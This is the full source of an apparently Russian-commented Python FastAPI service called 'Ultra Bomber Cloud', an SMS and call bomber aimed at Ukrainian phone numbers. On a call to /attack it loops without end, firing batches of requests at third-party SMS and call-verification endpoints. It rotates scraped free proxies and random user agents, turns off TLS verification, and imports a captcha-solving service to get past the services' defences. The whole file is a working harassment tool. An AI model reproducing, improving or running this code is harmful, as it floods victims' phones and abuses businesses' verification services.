import uvicorn
import asyncio
import httpx
import random
import json
import sys
import os
from fastapi import FastAPI, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from fake_useragent import UserAgent
from twocaptcha import TwoCaptcha

app = FastAPI(title="Ultra Bomber Cloud")
ua = UserAgent()

# Разрешаем подключения от твоего Mini App
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Модель данных для приема из JS
class TargetData(BaseModel):
    phone: str

# Настройки
CAPTCHA_API_KEY = "YOUR_2CAPTCHA_KEY"
solver = TwoCaptcha(CAPTCHA_API_KEY) if len(CAPTCHA_API_KEY) > 10 else None
active_tasks = {}
sem = asyncio.Semaphore(60)

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def load_data(filename):
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            if filename.endswith('.json'): return json.load(f)
            return [l.strip() for l in f if l.strip()]
    return []

async def fetch_free_proxies():
    urls = ["https://proxyscrape.com", "https://githubusercontent.com"]
    proxies = []
    async with httpx.AsyncClient() as client:
        for url in urls:
            try:
                r = await client.get(url, timeout=5)
                if r.status_code == 200:
                    proxies.extend([f"http://{l.strip()}" for l in r.text.split('\n') if ':' in l])
            except: continue
    return list(set(proxies))

async def send_request(service, phone, proxies):
    async with sem:
        if not active_tasks.get(phone, False): return
        proxy_url = random.choice(proxies) if proxies else None
        
        clean = phone.replace("+380", "").replace("380", "").replace("+", "")
        fmts = {"full": f"380{clean}", "short": f"0{clean}", "raw": clean}
        
        payload = {k: v.format(**fmts) if isinstance(v, str) else v for k, v in service.get('data', {}).items()}
        headers = {"User-Agent": ua.random, "Accept": "application/json"}

        try:
            async with httpx.AsyncClient(proxy=proxy_url, verify=False, timeout=8) as client:
                await client.post(service["url"], json=payload, headers=headers)
        except: pass

async def attack_worker(phone, sms_services, call_services, proxies):
    active_tasks[phone] = True
    while active_tasks.get(phone):
        tasks = []
        if sms_services:
            batch = random.sample(sms_services, min(len(sms_services), 8))
            tasks.extend([send_request(s, phone, proxies) for s in batch])
        if call_services:
            tasks.append(send_request(random.choice(call_services), phone, proxies))
        await asyncio.gather(*tasks)
        await asyncio.sleep(4)

# --- ЭНДПОИНТЫ ДЛЯ ИНТЕРФЕЙСА ---

@app.post("/attack")
async def start_api(data: TargetData, background_tasks: BackgroundTasks):
    target = data.phone.replace("+", "").strip()
    
    services = load_data('services.json')
    proxies = load_data('proxies.txt') or await fetch_free_proxies()

    sms_s = [s for s in services if s.get('type') == 'sms']
    call_s = [s for s in services if s.get('type') == 'call']

    background_tasks.add_task(attack_worker, target, sms_s, call_s, proxies)
    return {"status": "success", "message": "Атака запущена"}

@app.post("/stop")
async def stop_api():
    for phone in active_tasks:
        active_tasks[phone] = False
    return {"status": "success"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    uvicorn.run(app, host='0.0.0.0', port=port)
